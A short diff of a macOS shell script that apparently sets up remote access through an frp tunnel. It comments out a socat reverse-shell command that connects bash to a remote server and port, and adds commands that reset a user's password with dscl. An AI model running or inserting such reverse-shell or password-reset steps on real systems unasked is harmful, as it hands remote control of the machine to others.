@@ -31,8 +31,10 @@ cp frp_0.20.0_darwin_amd64/frpc ./bin/
 #sudo dscl . -create /Users/tttt
 echo "aaaaa5"
 #sudo dscl . -passwd /Users/tttt $jssshpwd
-echo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
+#echo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
+#socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
+resetpassword
+dscl . -passwd /Users/$jssshuser $jssshpwd
 
 rm -rf frpc.ini
 cat >> frpc.ini <<EOF
